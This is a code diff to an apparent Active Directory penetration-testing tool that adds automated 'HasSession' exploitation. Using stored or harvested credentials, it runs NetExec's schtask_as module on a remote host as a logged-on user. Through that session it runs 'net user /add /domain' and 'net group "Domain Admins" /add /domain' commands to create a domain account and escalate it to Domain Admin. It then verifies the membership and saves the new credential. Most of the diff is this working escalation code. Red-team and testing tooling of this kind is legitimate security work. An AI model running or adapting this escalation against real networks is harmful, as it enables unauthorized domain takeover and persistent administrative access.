@@ -13,9 +13,14 @@ from __future__ import annotations
 
 from typing import Any, Callable
 from contextlib import contextmanager
+from datetime import UTC, datetime
 import os
 import re
+import secrets
+import shlex
+import string
 import sys
+import time
 
 from rich.prompt import Confirm, Prompt
 from rich.table import Table
@@ -44,6 +49,8 @@ from adscan_internal.services.attack_graph_service import (
     compute_display_paths_for_user,
     get_owned_domain_usernames,
     resolve_netexec_target_for_node_label,
+    resolve_group_name_by_rid,
+    resolve_group_user_members,
     update_edge_status_by_labels,
 )
 from adscan_internal.services.attack_graph_runtime_service import (
@@ -81,6 +88,27 @@ def _normalize_account(value: str) -> str:
     return name.strip().lower()
 
 
+def _get_stored_domain_credential_for_user(
+    shell: Any, *, domain: str, username: str
+) -> str | None:
+    """Return stored credential for a domain user using case-insensitive lookup."""
+    normalized_target = _normalize_account(username)
+    if not normalized_target:
+        return None
+    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
+    credentials = domain_data.get("credentials")
+    if not isinstance(credentials, dict):
+        return None
+    for stored_user, stored_credential in credentials.items():
+        if _normalize_account(str(stored_user)) != normalized_target:
+            continue
+        if not isinstance(stored_credential, str):
+            return None
+        candidate = stored_credential.strip()
+        return candidate or None
+    return None
+
+
 def _env_flag_enabled(name: str) -> bool:
     """Return True when an environment flag is enabled."""
     return str(os.getenv(name, "")).strip().lower() in {
@@ -89,6 +117,37 @@ def _env_flag_enabled(name: str) -> bool:
         "yes",
         "on",
     }
+
+
+def _env_int(name: str, default: int, *, minimum: int = 0) -> int:
+    """Read an integer env var with fallback and floor."""
+    raw = str(os.getenv(name, str(default))).strip()
+    try:
+        value = int(raw)
+    except (TypeError, ValueError):
+        value = default
+    return max(minimum, value)
+
+
+_AUTO_REFRESH_AFFECTED_USERS_THRESHOLD = _env_int(
+    "ADSCAN_ATTACK_PATH_AUTO_REFRESH_MAX_AFFECTED_USERS",
+    150,
+    minimum=0,
+)
+
+
+def _affected_user_count(summary: dict[str, Any]) -> int:
+    """Return affected-user count from summary metadata when available."""
+    meta = summary.get("meta") if isinstance(summary.get("meta"), dict) else {}
+    if not isinstance(meta, dict):
+        return 0
+    count = meta.get("affected_user_count")
+    if isinstance(count, int) and count >= 0:
+        return count
+    users = meta.get("affected_users")
+    if isinstance(users, list):
+        return len(users)
+    return 0
 
 
 def _choose_custom_attack_path_start_step(
@@ -747,6 +806,548 @@ def _resolve_domain_password(shell: object, domain: str, username: str) -> str |
     if not isinstance(value, str) or not value:
         return None
     return value
+
+
+def _sanitize_filename_token(value: str, *, fallback: str) -> str:
+    """Return a filesystem-safe token for log file names."""
+    token = re.sub(r"[^a-zA-Z0-9_.-]+", "_", str(value or "").strip())
+    token = token.strip("._")
+    return token or fallback
+
+
+def _is_valid_domain_username(value: str, *, allow_machine: bool = False) -> bool:
+    """Validate a candidate domain username/sAMAccountName."""
+    candidate = str(value or "").strip()
+    if not candidate:
+        return False
+    if len(candidate) > 20:
+        return False
+    if allow_machine and candidate.endswith("$"):
+        candidate = candidate[:-1]
+    if not candidate:
+        return False
+    return bool(re.fullmatch(r"[A-Za-z0-9._-]+", candidate))
+
+
+def _generate_default_hassession_username() -> str:
+    """Generate a short default domain username for HasSession escalation."""
+    stamp = datetime.now(UTC).strftime("%m%d%H%M")
+    suffix = f"{secrets.randbelow(100):02d}"
+    return f"adscan{stamp}{suffix}"[:20]
+
+
+def _generate_strong_password(length: int = 12) -> str:
+    """Generate a random password with AD-friendly complexity guarantees."""
+    if length < 12:
+        length = 12
+    lowers = string.ascii_lowercase
+    uppers = string.ascii_uppercase
+    digits = string.digits
+    symbols = "!@#$%^&*_-+="
+    pool = lowers + uppers + digits + symbols
+    chars = [
+        secrets.choice(lowers),
+        secrets.choice(uppers),
+        secrets.choice(digits),
+        secrets.choice(symbols),
+    ]
+    chars.extend(secrets.choice(pool) for _ in range(length - len(chars)))
+    shuffled: list[str] = []
+    while chars:
+        idx = secrets.randbelow(len(chars))
+        shuffled.append(chars.pop(idx))
+    return "".join(shuffled)
+
+
+def _is_password_complex(value: str) -> bool:
+    """Return True when password meets minimum AD complexity target."""
+    password = str(value or "")
+    if len(password) < 12:
+        return False
+    has_lower = any(char.islower() for char in password)
+    has_upper = any(char.isupper() for char in password)
+    has_digit = any(char.isdigit() for char in password)
+    has_symbol = any(not char.isalnum() for char in password)
+    return has_lower and has_upper and has_digit and has_symbol
+
+
+def _run_netexec_for_domain(
+    shell: Any,
+    *,
+    domain: str,
+    command: str,
+    timeout: int = 300,
+) -> Any:
+    """Run a NetExec command with domain-aware retry/sync when available."""
+    netexec_runner = getattr(shell, "_run_netexec", None)
+    if callable(netexec_runner):
+        return netexec_runner(command, domain=domain, timeout=timeout)
+    return shell.run_command(command, timeout=timeout)
+
+
+def _run_hassession_schtask_command(
+    shell: Any,
+    *,
+    domain: str,
+    exec_username: str,
+    exec_password: str,
+    target_host: str,
+    session_user: str,
+    command_to_run: str,
+    log_suffix: str,
+) -> tuple[bool, str]:
+    """Execute NetExec `schtask_as` for HasSession abuse on a target host."""
+    marked_host = mark_sensitive(target_host, "hostname")
+    marked_exec_user = mark_sensitive(exec_username, "user")
+    marked_session_user = mark_sensitive(session_user, "user")
+    print_info_debug(
+        "[hassession] Running schtask_as on "
+        f"{marked_host} as session user {marked_session_user} "
+        f"(executor: {marked_exec_user})."
+    )
+    auth = shell.build_auth_nxc(exec_username, exec_password, domain, kerberos=False)
+    safe_host = _sanitize_filename_token(target_host, fallback="target")
+    safe_exec_user = _sanitize_filename_token(exec_username, fallback="executor")
+    safe_suffix = _sanitize_filename_token(log_suffix, fallback="command")
+    log_path = (
+        f"domains/{domain}/smb/"
+        f"hassession_{safe_suffix}_{safe_exec_user}_{safe_host}.log"
+    )
+    module_command = (
+        f"{shell.netexec_path} smb {shlex.quote(target_host)} {auth} "
+        f"-t 1 --timeout 60 --smb-timeout 10 "
+        f"-M schtask_as "
+        f"-o CMD={shlex.quote(command_to_run)} USER={shlex.quote(session_user)} "
+        f"--log {shlex.quote(log_path)}"
+    )
+    result = _run_netexec_for_domain(
+        shell,
+        domain=domain,
+        command=module_command,
+        timeout=300,
+    )
+    if result is None:
+        return False, ""
+    stdout = str(getattr(result, "stdout", "") or "")
+    stderr = str(getattr(result, "stderr", "") or "")
+    output = "\n".join(part for part in (stdout, stderr) if part)
+    return bool(getattr(result, "returncode", 1) == 0), output
+
+
+def _resolve_exec_password_for_user(
+    shell: Any,
+    *,
+    domain: str,
+    username: str,
+    context_username: str | None,
+    context_password: str | None,
+) -> str | None:
+    """Resolve the password/hash for ``username`` without mismatching context creds."""
+    if not username:
+        return None
+    context_user = _normalize_account(context_username or "")
+    if context_password and context_user and username.lower() == context_user.lower():
+        return context_password
+    return _resolve_domain_password(shell, domain, username)
+
+
+def _resolve_hassession_host_and_user(
+    shell: Any,
+    *,
+    domain: str,
+    from_label: str,
+    to_label: str,
+) -> tuple[str | None, str | None]:
+    """Resolve HasSession host and logged-on user from path labels."""
+    from_target = resolve_netexec_target_for_node_label(
+        shell, domain, node_label=from_label
+    )
+    to_target = resolve_netexec_target_for_node_label(shell, domain, node_label=to_label)
+    from_user = _normalize_account(from_label)
+    to_user = _normalize_account(to_label)
+
+    if isinstance(from_target, str) and from_target.strip():
+        host = from_target.strip()
+        return host, to_user or from_user or None
+    if isinstance(to_target, str) and to_target.strip():
+        host = to_target.strip()
+        return host, from_user or to_user or None
+    return None, to_user or from_user or None
+
+
+def _extract_group_name_from_label(value: str) -> str:
+    """Extract group name from canonical labels like ``GROUP@DOMAIN``."""
+    raw = str(value or "").strip()
+    if not raw:
+        return ""
+    if "@" in raw:
+        raw = raw.split("@", 1)[0].strip()
+    return raw
+
+
+def _resolve_users_from_principal_label(
+    shell: Any,
+    *,
+    domain: str,
+    principal_label: str,
+) -> list[str]:
+    """Resolve candidate users from a principal label (user or group)."""
+    normalized_user = _normalize_account(principal_label)
+    if _is_valid_domain_username(normalized_user):
+        return [normalized_user]
+
+    group_name = _extract_group_name_from_label(principal_label)
+    if not group_name:
+        return []
+    members = resolve_group_user_members(
+        shell,
+        domain,
+        group_name,
+        enabled_only=True,
+        max_results=500,
+    )
+    if members is None:
+        return []
+    valid_members = [
+        user
+        for user in members
+        if _is_valid_domain_username(user) and not str(user).endswith("$")
+    ]
+    return sorted(set(valid_members), key=str.lower)
+
+
+def _collect_previous_host_access_candidates(
+    shell: Any,
+    *,
+    domain: str,
+    steps: list[dict[str, Any]],
+    current_step_index: int,
+    target_host: str,
+    context_username: str | None,
+    context_password: str | None,
+) -> list[tuple[str, str]]:
+    """Collect candidate executor users from prior host-access relations.
+
+    Returns:
+        List of ``(username, reason)`` sorted by confidence/priority.
+    """
+    target_host_clean = str(target_host or "").strip().lower()
+    if not target_host_clean:
+        return []
+    relation_priority = {
+        "adminto": 0,
+        "sqladmin": 1,
+        "canpsremote": 2,
+        "canrdp": 3,
+    }
+    best: dict[str, tuple[tuple[int, int, int], str]] = {}
+
+    for index in range(current_step_index - 1, -1, -1):
+        step = steps[index]
+        if not isinstance(step, dict):
+            continue
+        action = str(step.get("action") or "").strip().lower()
+        if action not in relation_priority:
+            continue
+        details = step.get("details") if isinstance(step.get("details"), dict) else {}
+        from_label = str(details.get("from") or "").strip()
+        to_label = str(details.get("to") or "").strip()
+        if not from_label or not to_label:
+            continue
+        resolved_target = resolve_netexec_target_for_node_label(
+            shell, domain, node_label=to_label
+        )
+        if not isinstance(resolved_target, str) or not resolved_target.strip():
+            continue
+        if resolved_target.strip().lower() != target_host_clean:
+            continue
+
+        users = _resolve_users_from_principal_label(
+            shell,
+            domain=domain,
+            principal_label=from_label,
+        )
+        if not users:
+            continue
+        step_status = str(step.get("status") or "discovered").strip().lower()
+        status_rank = 0 if step_status == "success" else 1
+        distance = current_step_index - index
+        relation_rank = relation_priority[action]
+        reason = f"{action}:{step_status}"
+        for user in users:
+            password = _resolve_exec_password_for_user(
+                shell,
+                domain=domain,
+                username=user,
+                context_username=context_username,
+                context_password=context_password,
+            )
+            if not password:
+                continue
+            score = (status_rank, distance, relation_rank)
+            existing = best.get(user)
+            if existing is None or score < existing[0]:
+                best[user] = (score, reason)
+
+    ordered = sorted(best.items(), key=lambda item: (item[1][0], item[0]))
+    return [(username, metadata[1]) for username, metadata in ordered]
+
+
+def _select_candidate_executor_user(
+    shell: Any,
+    *,
+    candidates: list[tuple[str, str]],
+) -> str | None:
+    """Prompt operator to select candidate executor user when multiple exist."""
+    if not candidates:
+        return None
+    if len(candidates) == 1 or is_non_interactive(shell):
+        return candidates[0][0]
+    if not hasattr(shell, "_questionary_select"):
+        return candidates[0][0]
+
+    options = [
+        f"{mark_sensitive(user, 'user')}  [{reason}]"
+        for user, reason in candidates
+    ]
+    options.append("Cancel")
+    selected = shell._questionary_select(
+        "Select execution user for HasSession step:",
+        options,
+        default_idx=0,
+    )
+    if selected is None or selected >= len(options) - 1:
+        return None
+    return candidates[selected][0]
+
+
+def _find_previous_adminto_exec_user_for_host(
+    shell: Any,
+    *,
+    domain: str,
+    steps: list[dict[str, Any]],
+    current_step_index: int,
+    target_host: str,
+) -> str | None:
+    """Return the best prior AdminTo source user for the same target host.
+
+    Preference order:
+    1) nearest previous AdminTo with ``status=success`` and stored credential
+    2) nearest previous AdminTo with any status and stored credential
+    """
+    target_host_clean = str(target_host or "").strip().lower()
+    if not target_host_clean:
+        return None
+
+    fallback_user: str | None = None
+    for index in range(current_step_index - 1, -1, -1):
+        step = steps[index]
+        if not isinstance(step, dict):
+            continue
+        action = str(step.get("action") or "").strip().lower()
+        if action != "adminto":
+            continue
+        details = step.get("details") if isinstance(step.get("details"), dict) else {}
+        from_label = str(details.get("from") or "").strip()
+        to_label = str(details.get("to") or "").strip()
+        if not from_label or not to_label:
+            continue
+        resolved_target = resolve_netexec_target_for_node_label(
+            shell, domain, node_label=to_label
+        )
+        if not isinstance(resolved_target, str) or not resolved_target.strip():
+            continue
+        if resolved_target.strip().lower() != target_host_clean:
+            continue
+
+        candidate_user = _normalize_account(from_label)
+        if not _is_valid_domain_username(candidate_user):
+            continue
+        if not _resolve_domain_password(shell, domain, candidate_user):
+            continue
+
+        step_status = str(step.get("status") or "discovered").strip().lower()
+        if step_status == "success":
+            marked_user = mark_sensitive(candidate_user, "user")
+            marked_host = mark_sensitive(target_host, "hostname")
+            print_info_debug(
+                "[hassession] Selected executor from previous successful AdminTo: "
+                f"{marked_user} -> {marked_host}"
+            )
+            return candidate_user
+        if fallback_user is None:
+            fallback_user = candidate_user
+
+    if fallback_user:
+        marked_user = mark_sensitive(fallback_user, "user")
+        marked_host = mark_sensitive(target_host, "hostname")
+        print_info_debug(
+            "[hassession] Selected executor from previous AdminTo candidate: "
+            f"{marked_user} -> {marked_host}"
+        )
+    return fallback_user
+
+
+def _resolve_hassession_execution_user(
+    shell: Any,
+    *,
+    domain: str,
+    summary: dict[str, Any],
+    steps: list[dict[str, Any]],
+    current_step_index: int,
+    target_host: str,
+    from_label: str,
+    context_username: str | None,
+    context_password: str | None,
+) -> tuple[str | None, str | None, str]:
+    """Resolve executor credential context for HasSession exploitation."""
+    candidates = _collect_previous_host_access_candidates(
+        shell,
+        domain=domain,
+        steps=steps,
+        current_step_index=current_step_index,
+        target_host=target_host,
+        context_username=context_username,
+        context_password=context_password,
+    )
+    if candidates:
+        selected_user = _select_candidate_executor_user(shell, candidates=candidates)
+        if not selected_user:
+            return None, None, "cancelled"
+        password = _resolve_exec_password_for_user(
+            shell,
+            domain=domain,
+            username=selected_user,
+            context_username=context_username,
+            context_password=context_password,
+        )
+        if password:
+            reason_map = {user: reason for user, reason in candidates}
+            return selected_user, password, reason_map.get(
+                selected_user, "previous_host_access"
+            )
+
+    exec_username = _resolve_execution_user(
+        shell,
+        domain=domain,
+        context_username=context_username,
+        summary=summary,
+        from_label=from_label,
+    )
+    if not exec_username:
+        return None, None, "unresolved"
+    password = _resolve_exec_password_for_user(
+        shell,
+        domain=domain,
+        username=exec_username,
+        context_username=context_username,
+        context_password=context_password,
+    )
+    return exec_username, password, "generic_context"
+
+
+def _resolve_domain_admin_group_candidates(shell: Any, domain: str) -> list[str]:
+    """Return candidate localized names for the Domain Admins group."""
+    candidates: list[str] = []
+    resolved = resolve_group_name_by_rid(shell, domain, 512)
+    if isinstance(resolved, str) and resolved.strip():
+        candidates.append(resolved.strip())
+    candidates.extend(["Domain Admins", "Admins. del dominio"])
+
+    unique: list[str] = []
+    seen: set[str] = set()
+    for name in candidates:
+        normalized = str(name or "").strip()
+        key = normalized.lower()
+        if not normalized or key in seen:
+            continue
+        seen.add(key)
+        unique.append(normalized)
+    return unique
+
+
+def _resolve_hassession_verify_delay_seconds(shell: Any | None = None) -> float:
+    """Return post-add delay before verifying HasSession Domain Admin membership."""
+    interactive_default = 0.0 if is_non_interactive(shell) else 3.0
+    raw = str(os.getenv("ADSCAN_HASSESSION_VERIFY_DELAY_SECONDS", "")).strip()
+    if not raw:
+        return interactive_default
+    try:
+        value = float(raw)
+    except ValueError:
+        print_info_debug(
+            "[hassession] Invalid ADSCAN_HASSESSION_VERIFY_DELAY_SECONDS value; "
+            f"using default {interactive_default:.1f}s."
+        )
+        return interactive_default
+    if value < 0:
+        return 0.0
+    return min(value, 30.0)
+
+
+def _wait_for_hassession_membership_propagation(
+    shell: Any,
+    *,
+    domain: str,
+    target_user: str,
+) -> None:
+    """Wait briefly for AD membership propagation before verification checks."""
+    delay_seconds = _resolve_hassession_verify_delay_seconds(shell)
+    if delay_seconds <= 0:
+        return
+    marked_user = mark_sensitive(target_user, "user")
+    marked_domain = mark_sensitive(domain, "domain")
+    print_info_debug(
+        "[hassession] Waiting "
+        f"{delay_seconds:.1f}s before verifying Domain Admin membership for "
+        f"{marked_user}@{marked_domain}."
+    )
+    time.sleep(delay_seconds)
+
+
+def _is_user_domain_admin_via_sid(
+    shell: Any,
+    *,
+    domain: str,
+    target_user: str,
+    auth_username: str,
+    auth_password: str,
+) -> bool | None:
+    """Verify Domain Admin membership via recursive LDAP SID resolution."""
+    try:
+        from adscan_internal.cli.ldap import get_recursive_principal_group_sids_in_chain
+        from adscan_internal.services.privileged_group_classifier import (
+            classify_privileged_membership_from_group_sids,
+        )
+
+        group_sids = get_recursive_principal_group_sids_in_chain(
+            shell,
+            domain=domain,
+            target_samaccountname=target_user,
+            auth_username=auth_username,
+            auth_password=auth_password,
+            retries=4,
+            retry_delay_seconds=1.0,
+            retry_backoff=1.75,
+            retry_on_empty=True,
+            prefer_kerberos=True,
+            allow_ntlm_fallback=True,
+        )
+        if group_sids is None:
+            return None
+        if not group_sids:
+            return False
+        membership = classify_privileged_membership_from_group_sids(group_sids)
+        return bool(membership.domain_admin)
+    except Exception as exc:  # noqa: BLE001
+        telemetry.capture_exception(exc)
+        marked_user = mark_sensitive(target_user, "user")
+        marked_domain = mark_sensitive(domain, "domain")
+        print_info_debug(
+            "[hassession] Failed to verify Domain Admin membership for "
+            f"{marked_user}@{marked_domain}: {exc}"
+        )
+        return None
 
 
 def _find_next_step_by_action(
@@ -2256,6 +2857,424 @@ def execute_selected_attack_path(
                         )
                 continue
 
+            if key == "hassession":
+                if not from_label or not to_label:
+                    print_warning("Cannot execute HasSession: missing from/to details.")
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing from/to details",
+                    )
+                    return execution_started
+
+                target_host, session_user = _resolve_hassession_host_and_user(
+                    shell,
+                    domain=domain,
+                    from_label=from_label,
+                    to_label=to_label,
+                )
+                if not target_host:
+                    print_warning(
+                        "Cannot execute HasSession: session host is not resolvable."
+                    )
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Session host is not resolvable",
+                    )
+                    return execution_started
+                if not session_user or not _is_valid_domain_username(
+                    session_user, allow_machine=True
+                ):
+                    print_warning(
+                        "Cannot execute HasSession: session user is not resolvable."
+                    )
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Session user is not resolvable",
+                    )
+                    return execution_started
+
+                exec_username, password, exec_context_source = (
+                    _resolve_hassession_execution_user(
+                        shell,
+                        domain=domain,
+                        summary=summary,
+                        steps=steps,
+                        current_step_index=idx - 1,
+                        target_host=target_host,
+                        from_label=from_label,
+                        context_username=context_username,
+                        context_password=context_password,
+                    )
+                )
+                if not exec_username or not password:
+                    marked_user = mark_sensitive(exec_username or from_label, "user")
+                    print_warning(
+                        "Cannot execute HasSession: no stored credential found for "
+                        f"{marked_user}."
+                    )
+                    _mark_blocked_step(
+                        action,
+                        from_label,
+                        to_label,
+                        kind="unavailable",
+                        reason="Missing stored credential for execution user",
+                    )
+                    return execution_started
+                if exec_context_source == "generic_context":
+                    print_info_debug(
+                        "[hassession] No prior host-access credential context "
+                        "for this host; using generic execution credential context."
+                    )
+
+                non_interactive = is_non_interactive(shell)
+                create_new_user = True
+                if not non_interactive and hasattr(shell, "_questionary_select"):
+                    options = [
+                        "Create new domain user, then add to Domain Admins (Recommended)",
+                        "Add existing domain user to Domain Admins",
+                        "Cancel",
+                    ]
+                    choice = shell._questionary_select(
+                        "HasSession exploitation mode:",
+                        options,
+                        default_idx=0,
+                    )
+                    if choice is None or choice >= len(options) - 1:
+                        return execution_started
+                    create_new_user = choice == 0
+                elif not non_interactive:
+                    create_new_user = Confirm.ask(
+                        "Create a new domain user and add it to Domain Admins?",
+                        default=True,
+                    )
+
+                target_user = ""
+                target_password: str | None = None
+                if create_new_user:
+                    default_user = _generate_default_hassession_username()
+                    if non_interactive:
+                        selected_user = default_user
+                    else:
+                        selected_user = Prompt.ask(
+                            "New domain username to create",
+                            default=default_user,
+                        ).strip()
+                    selected_user = _normalize_account(selected_user)
+                    if not _is_valid_domain_username(selected_user):
+                        print_warning(
+                            "Cannot execute HasSession: invalid new username. "
+                            "Use 1-20 chars with letters, digits, dot, underscore or hyphen."
+                        )
+                        return execution_started
+
+                    generated_password = _generate_strong_password(12)
+                    if non_interactive:
+                        selected_password = generated_password
+                    else:
+                        selected_password = Prompt.ask(
+                            "Password for the new domain user",
+                            default=generated_password,
+                        ).strip()
+                    if not _is_password_complex(selected_password):
+                        print_warning(
+                            "Cannot execute HasSession: password must be at least "
+                            "12 chars and include lower/upper/digit/symbol."
+                        )
+                        return execution_started
+                    target_user = selected_user
+                    target_password = selected_password
+                else:
+                    stored_creds = (
+                        getattr(shell, "domains_data", {})
+                        .get(domain, {})
+                        .get("credentials", {})
+                    )
+                    credential_users = (
+                        sorted(
+                            {
+                                str(user).strip()
+                                for user in stored_creds.keys()
+                                if isinstance(user, str)
+                                and _is_valid_domain_username(
+                                    _normalize_account(user)
+                                )
+                            },
+                            key=str.lower,
+                        )
+                        if isinstance(stored_creds, dict)
+                        else []
+                    )
+                    if non_interactive:
+                        selected_user = exec_username
+                    elif hasattr(shell, "_questionary_select") and credential_users:
+                        options = credential_users + ["Enter username", "Cancel"]
+                        selected_idx = shell._questionary_select(
+                            "Select the user to elevate to Domain Admins:",
+                            options,
+                            default_idx=0,
+                        )
+                        if selected_idx is None or selected_idx >= len(options) - 1:
+                            return execution_started
+                        if selected_idx == len(options) - 2:
+                            selected_user = Prompt.ask(
+                                "Existing username to add to Domain Admins",
+                                default=exec_username,
+                            ).strip()
+                        else:
+                            selected_user = options[selected_idx]
+                    else:
+                        selected_user = Prompt.ask(
+                            "Existing username to add to Domain Admins",
+                            default=exec_username,
+                        ).strip()
+                    target_user = _normalize_account(selected_user)
+                    if not _is_valid_domain_username(target_user):
+                        print_warning(
+                            "Cannot execute HasSession: invalid target username."
+                        )
+                        return execution_started
+
+                group_candidates = _resolve_domain_admin_group_candidates(shell, domain)
+                if not group_candidates:
+                    group_candidates = ["Domain Admins", "Admins. del dominio"]
+
+                marked_host = mark_sensitive(target_host, "hostname")
+                marked_session_user = mark_sensitive(session_user, "user")
+                marked_exec_user = mark_sensitive(exec_username, "user")
+                marked_target_user = mark_sensitive(target_user, "user")
+                mode_label = "create+addmember" if create_new_user else "addmember"
+                print_panel(
+                    "\n".join(
+                        [
+                            f"Domain: {mark_sensitive(domain, 'domain')}",
+                            f"Target host: {marked_host}",
+                            f"Session user: {marked_session_user}",
+                            f"Executor: {marked_exec_user}",
+                            f"Mode: {mode_label}",
+                            f"Target user: {marked_target_user}",
+                        ]
+                    ),
+                    title=Text(
+                        "HasSession Exploitation Plan",
+                        style=f"bold {BRAND_COLORS['info']}",
+                    ),
+                    border_style=BRAND_COLORS["info"],
+                    expand=False,
+                )
+
+                if not non_interactive and not Confirm.ask(
+                    "Execute HasSession exploitation now?",
+                    default=True,
+                ):
+                    return execution_started
+
+                execution_started = True
+                with _active_step_context(
+                    action=action,
+                    from_label=from_label,
+                    to_label=to_label,
+                    notes={
+                        "username": exec_username,
+                        "target_host": target_host,
+                        "session_user": session_user,
+                        "target_user": target_user,
+                        "mode": mode_label,
+                        "exec_context_source": exec_context_source,
+                    },
+                ):
+                    try:
+                        update_edge_status_by_labels(
+                            shell,
+                            domain,
+                            from_label=from_label,
+                            relation=action,
+                            to_label=to_label,
+                            status="attempted",
+                            notes={
+                                "username": exec_username,
+                                "target_host": target_host,
+                                "session_user": session_user,
+                                "target_user": target_user,
+                                "mode": mode_label,
+                                "exec_context_source": exec_context_source,
+                            },
+                        )
+                    except Exception as exc:  # noqa: BLE001
+                        telemetry.capture_exception(exc)
+
+                    command_failed = False
+                    if create_new_user and target_password is not None:
+                        create_command = (
+                            f'net user "{target_user}" "{target_password}" /add /domain'
+                        )
+                        create_ok, create_output = _run_hassession_schtask_command(
+                            shell,
+                            domain=domain,
+                            exec_username=exec_username,
+                            exec_password=password,
+                            target_host=target_host,
+                            session_user=session_user,
+                            command_to_run=create_command,
+                            log_suffix="create_user",
+                        )
+                        if not create_ok:
+                            lowered = create_output.lower()
+                            already_exists = any(
+                                marker in lowered
+                                for marker in (
+                                    "account already exists",
+                                    "ya existe",
+                                    "el usuario ya existe",
+                                    "2224",
+                                )
+                            )
+                            if already_exists:
+                                print_warning(
+                                    "Target user already exists. Continuing with group escalation."
+                                )
+                            else:
+                                print_warning(
+                                    "HasSession user-creation command did not complete successfully."
+                                )
+                                command_failed = True
+
+                    verified_da = False
+                    selected_group: str | None = None
+                    waited_for_membership = False
+                    if not command_failed:
+                        for group_name in group_candidates:
+                            add_command = (
+                                f'net group "{group_name}" "{target_user}" /add /domain'
+                            )
+                            add_ok, _ = _run_hassession_schtask_command(
+                                shell,
+                                domain=domain,
+                                exec_username=exec_username,
+                                exec_password=password,
+                                target_host=target_host,
+                                session_user=session_user,
+                                command_to_run=add_command,
+                                log_suffix=f"addmember_{group_name}",
+                            )
+                            if not add_ok:
+                                continue
+                            if not waited_for_membership:
+                                _wait_for_hassession_membership_propagation(
+                                    shell,
+                                    domain=domain,
+                                    target_user=target_user,
+                                )
+                                waited_for_membership = True
+                            membership = _is_user_domain_admin_via_sid(
+                                shell,
+                                domain=domain,
+                                target_user=target_user,
+                                auth_username=exec_username,
+                                auth_password=password,
+                            )
+                            if membership is True:
+                                verified_da = True
+                                selected_group = group_name
+                                break
+
+                    if not verified_da and not command_failed:
+                        if not waited_for_membership:
+                            _wait_for_hassession_membership_propagation(
+                                shell,
+                                domain=domain,
+                                target_user=target_user,
+                            )
+                        membership = _is_user_domain_admin_via_sid(
+                            shell,
+                            domain=domain,
+                            target_user=target_user,
+                            auth_username=exec_username,
+                            auth_password=password,
+                        )
+                        verified_da = membership is True
+
+                    if verified_da:
+                        try:
+                            update_edge_status_by_labels(
+                                shell,
+                                domain,
+                                from_label=from_label,
+                                relation=action,
+                                to_label=to_label,
+                                status="success",
+                                notes={
+                                    "username": exec_username,
+                                    "target_host": target_host,
+                                    "session_user": session_user,
+                                    "target_user": target_user,
+                                    "mode": mode_label,
+                                    "group": selected_group or "RID-512",
+                                    "exec_context_source": exec_context_source,
+                                },
+                            )
+                        except Exception as exc:  # noqa: BLE001
+                            telemetry.capture_exception(exc)
+
+                        print_info(
+                            "HasSession escalation confirmed: "
+                            f"{mark_sensitive(target_user, 'user')} is now in "
+                            "Domain Admins (RID 512)."
+                        )
+                        if hasattr(shell, "add_credential"):
+                            credential_to_register = target_password or (
+                                _get_stored_domain_credential_for_user(
+                                    shell, domain=domain, username=target_user
+                                )
+                            )
+                            if credential_to_register:
+                                add_credential_fn = getattr(shell, "add_credential", None)
+                                if callable(add_credential_fn):
+                                    add_credential_fn(
+                                        domain,
+                                        target_user,
+                                        credential_to_register,
+                                    )
+                            else:
+                                print_info_debug(
+                                    "[hassession] Escalation verified but no stored credential "
+                                    f"available for {mark_sensitive(target_user, 'user')}; "
+                                    "skipping add_credential post-flow trigger."
+                                )
+                    else:
+                        try:
+                            update_edge_status_by_labels(
+                                shell,
+                                domain,
+                                from_label=from_label,
+                                relation=action,
+                                to_label=to_label,
+                                status="failed",
+                                notes={
+                                    "username": exec_username,
+                                    "target_host": target_host,
+                                    "session_user": session_user,
+                                    "target_user": target_user,
+                                    "mode": mode_label,
+                                    "exec_context_source": exec_context_source,
+                                },
+                            )
+                        except Exception as exc:  # noqa: BLE001
+                            telemetry.capture_exception(exc)
+                        print_warning(
+                            "HasSession exploitation executed, but Domain Admin "
+                            "membership could not be verified."
+                        )
+                continue
+
             if key == "allowedtodelegate":
                 if not from_label or not to_label:
                     print_warning(
@@ -2494,6 +3513,7 @@ def offer_attack_paths_for_execution(
                 shell,
                 domain,
                 max_depth=max_depth,
+                max_paths=None,
                 require_high_value_target=require_high_value_target,
             )
             return owned_summaries
@@ -2505,6 +3525,7 @@ def offer_attack_paths_for_execution(
             domain,
             username=start,
             max_depth=max_depth,
+            max_paths=None,
             require_high_value_target=require_high_value_target,
         )
 
@@ -2578,6 +3599,7 @@ def offer_attack_paths_for_execution_for_principals(
             domain,
             principals=principals,
             max_depth=max_depth,
+            max_paths=None,
             require_high_value_target=require_high_value_target,
         )
 
@@ -2887,6 +3909,28 @@ def offer_attack_paths_for_execution_summaries(
                 return True
             if single_pass:
                 return True
+            affected_count = _affected_user_count(selected)
+            if (
+                recompute_summaries is not None
+                and _AUTO_REFRESH_AFFECTED_USERS_THRESHOLD > 0
+                and affected_count >= _AUTO_REFRESH_AFFECTED_USERS_THRESHOLD
+            ):
+                print_info(
+                    "Execution completed. Skipping automatic attack-path refresh "
+                    f"(affected principals={affected_count}, threshold={_AUTO_REFRESH_AFFECTED_USERS_THRESHOLD}). "
+                    "All attack steps are already persisted; only the live list refresh is deferred. "
+                    "Run `attack_paths <domain> owned` when you want a fresh recomputation."
+                )
+                print_info_debug(
+                    "[attack_paths] auto-refresh skipped after execution: "
+                    f"domain={marked_domain} affected_users={affected_count} "
+                    f"threshold={_AUTO_REFRESH_AFFECTED_USERS_THRESHOLD}"
+                )
+                return True
+            print_info_verbose(
+                "Refreshing attack-path summaries after execution "
+                "(this can take longer on large domains)."
+            )
             summaries = _refresh_summaries()
             if summaries:
                 print_info_debug(
